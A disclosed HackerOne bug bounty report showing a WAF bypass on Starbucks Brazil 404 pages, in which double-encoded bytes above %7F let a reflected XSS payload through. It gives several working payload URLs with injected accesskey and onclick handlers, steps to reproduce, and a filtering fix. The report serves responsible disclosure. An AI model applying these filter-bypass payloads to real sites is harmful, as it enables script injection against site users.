# WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)

## Report Details
- **Report ID**: 716761
- **URL**: https://hackerone.com/reports/716761
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-10-17T22:16:54.926Z
- **Disclosed**: 2020-01-29T17:33:19.699Z

## Reporter
- **Username**: laszaro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
**Summary:** Report [629745](https://hackerone.com/reports/629745) not properly resolved: "Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution".

**Description:**
Report 629745 caught my attention, so I began testing the WAF to see if I could find any other issues. After a while I found out that the previously reported issue was not properly resolved as I was able to bypass the double encoding filter.

The original payload on the report was something like this:
```
https://www.starbucks.com.br/testing%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```
and it got resolved. But you can bypass the filter with this:
```
https://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```
Notice the `%80` between `%2522` and `%2520`. In fact, you can replace the `%80` with any hex value __beyond `%7f`__  and the payload still works (there's a couple of exceptions throwing "Bad Request" errors:  `%81`, `%8d`, `%8f`, `%90`, and `%9d`), but values in the range `%00-%7f` get properly filtered out (throwing custom "Server Error" pages and 404 pages, 301 and 302 redirect pages, and default 400 Bad Request errors, depending on the value)

So, this payload works:
```
https://www.starbucks.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
```
but this one doesn't:
```
https://www.starbucks.com.br/testing%2522%7F%2520accesskey='x'%2520onclick='confirm%601%60'
```

There is a similar behaviour if you put the double-hex digit first.
This payload breaks the filter:
```
https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```
but this one doesn't:
```
https://www.starbucks.com.br/testing%7F%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```

**Platform(s) Affected:** Firefox 69.0.3

## Steps To Reproduce:

  1. Visit this link on Firefox: 

```
https://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```

  2. Press CONTROL+ALT+X on Mac, or ALT+SHIFT+X on Windows

## Recommendations for fix
The range of hex values `%80-%FF` is breaking the WAF filter, those values need to be filtered out just like the range `%00-%7F` is being filtered out.

## Impact

As the original report said:
"JavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf".

## Attachments
No attachments
